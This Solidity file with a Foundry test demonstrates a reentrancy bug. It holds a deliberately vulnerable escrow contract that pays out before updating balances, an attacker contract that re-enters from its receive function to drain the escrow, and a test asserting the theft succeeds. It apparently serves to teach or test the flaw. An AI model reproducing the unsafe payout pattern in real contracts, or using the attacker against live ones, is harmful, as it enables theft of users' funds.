// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

contract VulnerableEscrow {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function releaseEscrowFunds(address payable _to) external {
        require(balances[_to] > 0, "No funds to release");
        (bool success, ) = _to.call{value: balances[_to]}(""); // Unsafe transfer
        require(success, "Transfer failed");
        balances[_to] = 0; // State update happens after transfer - Vulnerability!
    }
}

// Attacker Contract
contract ReentrancyAttacker {
    VulnerableEscrow public escrow;
    address public owner;

    constructor(address _escrow) {
        escrow = VulnerableEscrow(_escrow);
        owner = msg.sender;
    }

    // Attack function
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        escrow.deposit{value: msg.value}();
        escrow.releaseEscrowFunds(payable(address(this))); // Trigger attack
    }

    receive() external payable {
        if (address(escrow).balance > 0) {
            escrow.releaseEscrowFunds(payable(address(this))); // Re-enter and drain funds
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

// Foundry Test
contract ReentrancyTest is Test {
    VulnerableEscrow escrow;
    ReentrancyAttacker attacker;
    address user = address(0x1);
    address attackerAddr = address(0x2);

    function setUp() public {
        vm.deal(user, 10 ether);
        vm.deal(attackerAddr, 2 ether);

        escrow = new VulnerableEscrow();
        attacker = new ReentrancyAttacker(address(escrow));
        
        vm.prank(user);
        escrow.deposit{value: 5 ether}(); // User deposits 5 ETH
    }

    function testReentrancyAttack() public {
        vm.prank(attackerAddr);
        attacker.attack{value: 1 ether}();

        assertEq(address(escrow).balance, 0, "Escrow should be drained");
        assertGt(address(attacker).balance, 5 ether, "Attacker should steal funds");
    }
}
